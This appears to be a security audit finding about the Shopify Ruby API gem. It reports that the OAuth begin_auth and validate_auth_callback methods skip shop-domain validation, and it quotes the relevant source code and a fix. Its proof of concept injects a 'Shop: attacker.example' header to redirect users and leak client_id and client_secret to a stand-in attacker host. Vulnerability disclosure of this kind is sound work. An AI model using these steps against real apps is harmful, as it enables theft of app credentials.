Confirmed: `ShopifyAPI::Auth::Oauth.begin_auth` and `ShopifyAPI::Auth::Oauth.validate_auth_callback` in `lib/shopify_api/auth/oauth.rb` never call `ShopifyAPI::Utils::ShopValidator.sanitize!`/`sanitize_shop_domain` on the `shop` value, unlike `token_exchange.rb`, `client_credentials.rb`, `refresh_token.rb`, and `clients/graphql/storefront.rb`, which all do validate the shop domain via `ShopValidator` before using it.

### Title
OAuth flow accepts unsanitized `shop` domain, sending `client_id`/`client_secret` to attacker-controlled hosts - (File: lib/shopify_api/auth/oauth.rb)

### Summary
`ShopifyAPI::Auth::Oauth.begin_auth` and `ShopifyAPI::Auth::Oauth.validate_auth_callback` use the caller-supplied `shop` string directly to construct the host that will receive the app's OAuth `client_id` (in `begin_auth`) and `client_secret` (in `validate_auth_callback`), without ever validating it against `ShopifyAPI::Utils::ShopValidator`'s trusted-domain allowlist as every other credential-bearing flow in this gem does.

### Finding Description
`ShopifyAPI::Utils::ShopValidator` exists specifically to constrain shop domains to `TRUSTED_SHOPIFY_DOMAINS` (`shopify.com`, `myshopify.io`, `myshopify.com`, `spin.dev`, `shop.dev`) plus an optional configured `myshopify_domain` [1](#0-0) , and `sanitize!` raises `InvalidShopError` for anything outside that set [2](#0-1) . Every other place in this gem that turns a caller-provided `shop` string into a network destination that carries app credentials calls this validator: `TokenExchange`, `ClientCredentials`, `RefreshToken`, and the storefront GraphQL client all reference `ShopValidator`.

`Oauth.begin_auth`, however, takes `shop:` straight from its caller and passes it unchecked into `auth_base_uri(shop)`, which builds `"https://#{shop}/admin"` and then appends `/oauth/authorize?...` with `client_id: ShopifyAPI::Context.api_key` in the query string [3](#0-2) [4](#0-3) . The library's own documented usage pattern feeds this `shop` from a raw request header (`shop = request.headers["Shop"]`) with no sanitization shown [5](#0-4) .

Worse, `Oauth.validate_auth_callback` builds `null_session = Auth::Session.new(shop: auth_query.shop)` from the `shop` field of the `AuthQuery` and then issues an HTTP POST containing `client_secret: Context.api_secret_key` to that same `shop`-derived host via `Clients::HttpClient.new(session: null_session, base_path: "/admin/oauth")` [6](#0-5) . The only check performed on `auth_query` before this happens is the HMAC validation, and the HMAC's signable string itself includes `shop` and `host` as fields covered by the signature [7](#0-6) , so `shop`/`host` are "verified" as unmodified relative to whatever the redirecting party sent — but their *content* is never checked to be an actual trusted Shopify domain. There is no re-derivation of `shop` from a known-good source (e.g. `ShopValidator.sanitize!`) the way `TokenExchange.exchange_token` does after JWT validation.

This breaks the intended binding: **host that receives `client_secret`/`client_id` == a Shopify-trusted domain**. Instead the binding actually enforced is only **host in the callback == host that was HMAC-signed**, which is a different and weaker guarantee, since nothing constrains what value can end up signed/passed through if the host application (following the documented pattern) forwards attacker-influenced input into `begin_auth`.

### Impact Explanation
If a host application follows the documented pattern of sourcing `shop` from user-controlled input (a header, query param, or subdomain) without pre-validating it — which this gem does nothing to prevent and does not enforce internally — `begin_auth` will redirect a victim's browser to an attacker-chosen origin while including the app's `client_id` in the URL, and any subsequent callback that reaches `validate_auth_callback` with a `shop` value pointing at an attacker/SSRF target will cause this gem to POST the app's `client_secret` to that host over `client.request(...)`. This is SSRF carrying the app's credentials to a caller-influenced host, matching the "High" severity class (SSRF with the app's credentials, credential leakage) called out in scope.

### Likelihood Explanation
Exploitability depends on the host application not independently validating `shop` before calling `begin_auth`/`validate_auth_callback` — the gem provides no internal enforcement and its own documentation shows `shop` sourced directly from a request header without sanitization, making this a realistic integration pitfall rather than a purely theoretical one. Other equivalent flows in the same gem (`TokenExchange`, `ClientCredentials`, `RefreshToken`) *do* self-validate via `ShopValidator`, underscoring that `Oauth` is the outlier missing this defense-in-depth check.

### Recommendation
Call `ShopifyAPI::Utils::ShopValidator.sanitize!(shop, myshopify_domain: ...)` (or `sanitize_shop_domain`) at the top of `Oauth.begin_auth` and again on `auth_query.shop`/`auth_query.host` at the top of `Oauth.validate_auth_callback`, raising `Errors::InvalidShopError` before any request is constructed — mirroring the pattern already used in `lib/shopify_api/auth/token_exchange.rb`, `lib/shopify_api/auth/client_credentials.rb`, and `lib/shopify_api/auth/refresh_token.rb`.

### Proof of Concept
1. A host application implements the OAuth begin route as shown in this gem's own docs: `shop = request.headers["Shop"]; ShopifyAPI::Auth::Oauth.begin_auth(shop: shop, redirect_path: "/auth/callback")` [8](#0-7) .
2. An unprivileged attacker sends a request with `Shop: attacker.example` (or a value resolving to an attacker-controlled/internal host). `auth_base_uri` builds `https://attacker.example/admin/oauth/authorize?client_id=<APP_CLIENT_ID>&...` [4](#0-3)  and the app redirects the victim's browser there, leaking the app's `client_id` and OAuth flow parameters to the attacker's server.
3. If the host app's callback handler passes through a `shop`/`host` value that ends up reaching `validate_auth_callback` for that same attacker-controlled domain (e.g., a compromised or attacker-registered dev store, or any path where the shop value used to build the outbound request is not independently re-validated), `client.request` in `Oauth.validate_auth_callback` sends a POST containing `client_secret: Context.api_secret_key` to `https://<attacker-controlled-shop>/admin/oauth/access_token` [9](#0-8) , exfiltrating the app's `client_secret` to the attacker's server.

        def begin_auth(shop:, redirect_path:, is_online: true, scope_override: nil)
          scope = if scope_override.nil?
            ShopifyAPI::Context.scope
          elsif scope_override.is_a?(ShopifyAPI::Auth::AuthScopes)
            scope_override
          else
            ShopifyAPI::Auth::AuthScopes.new(scope_override)
          end

          unless Context.setup?
            raise Errors::ContextNotSetupError, "ShopifyAPI::Context not setup, please call ShopifyAPI::Context.setup"
          end
          raise Errors::UnsupportedOauthError, "Cannot perform OAuth for private apps." if Context.private?

          state = SecureRandom.alphanumeric(NONCE_LENGTH)

          cookie = SessionCookie.new(value: state, expires: Time.now + 60)

          query = {
            client_id: ShopifyAPI::Context.api_key,
            scope: scope.to_s,
            redirect_uri: "#{ShopifyAPI::Context.host}#{redirect_path}",
            state: state,
            "grant_options[]": is_online ? "per-user" : "",
          }

          query_string = URI.encode_www_form(query)
          auth_route = auth_base_uri(shop) + "/oauth/authorize?#{query_string}"

          { auth_route: auth_route, cookie: cookie }
        end

        def validate_auth_callback(cookies:, auth_query:)
          unless Context.setup?
            raise Errors::ContextNotSetupError, "ShopifyAPI::Context not setup, please call ShopifyAPI::Context.setup"
          end
          raise Errors::InvalidOauthError, "Invalid OAuth callback." unless Utils::HmacValidator.validate(auth_query)
          raise Errors::UnsupportedOauthError, "Cannot perform OAuth for private apps." if Context.private?

          state = cookies[SessionCookie::SESSION_COOKIE_NAME]
          raise Errors::NoSessionCookieError unless state

          raise Errors::InvalidOauthError,
            "Invalid state in OAuth callback." unless state == auth_query.state

          null_session = Auth::Session.new(shop: auth_query.shop)
          body = {
            client_id: Context.api_key,
            client_secret: Context.api_secret_key,
            code: auth_query.code,
            expiring: Context.expiring_offline_access_tokens ? 1 : 0, # Only applicable for offline tokens
          }

          client = Clients::HttpClient.new(session: null_session, base_path: "/admin/oauth")
          response = begin
            client.request(
              Clients::HttpRequest.new(
                http_method: :post,
                path: "access_token",
                body: body,
                body_type: "application/json",
              ),
            )
          rescue ShopifyAPI::Errors::HttpResponseError => e
            raise Errors::RequestAccessTokenError,
              "Cannot complete OAuth process. Received a #{e.code} error while requesting access token."
          end
